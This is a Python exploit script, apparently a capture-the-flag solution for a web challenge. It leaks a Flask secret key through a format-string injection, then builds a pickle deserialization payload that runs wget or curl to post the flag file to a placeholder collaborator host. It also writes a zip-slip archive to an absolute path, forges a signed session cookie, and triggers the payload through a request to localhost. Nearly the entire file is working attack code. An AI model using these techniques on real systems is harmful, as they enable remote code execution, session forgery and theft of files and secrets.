import zipfile
import os
import pickle
import requests
from itsdangerous import URLSafeTimedSerializer
import hashlib
import json

# absolute path the archive should write to when extracted
TARGET_PATH = "/app/data/targets.db"
ZIP_NAME = "exploit.zip"  # name of the generated zip file

BASE = "https://0ce5d657757a5838-psyduck-portal-app.challs.ico-official.net"

secret_key = requests.get(f"{BASE}/api/config", params={
    "reset": "{c.__init__.__globals__[app].secret_key}"}).json()["reset"]


class Exploit(object):
    def __reduce__(self):
        return (os.system, ('wget --post-file=$(ls /flag*) --output-document - https://YOUR-COLLABORATOR-URL.example',))
        # return (os.system, ('curl https://YOUR-COLLABORATOR-URL.example --data-binary @$(ls /flag*)',))


data = pickle.dumps(Exploit())
encrypted = bytes([data[i] ^ secret_key.encode()[i %
                  len(secret_key)] for i in range(len(data))])

# Use an absolute member name so os.path.join(UPLOAD_DIR, member) yields the absolute path directly.
with zipfile.ZipFile(ZIP_NAME, "w", compression=zipfile.ZIP_DEFLATED) as zf:
    zf.writestr(TARGET_PATH, encrypted)

serializer = URLSafeTimedSerializer(
    secret_key,
    serializer=json,
    salt="cookie-session",
    signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1},
)
token = serializer.dumps({"authenticated": True})

with open(ZIP_NAME, "rb") as fh:
    files = {"file": fh}
    res = requests.post(f"{BASE}/dashboard/upload", files=files, cookies={"session": token})
print(res.status_code)
print(res.text)

res = requests.post(f"{BASE}/dashboard/verify", data={
                    "url": "http://localhost:5000/api/generate"}, cookies={"session": token})
# res = requests.get(f"{BASE}/api/generate")
print(res.status_code)
print(res.text)

# Visit reqbin for the flag
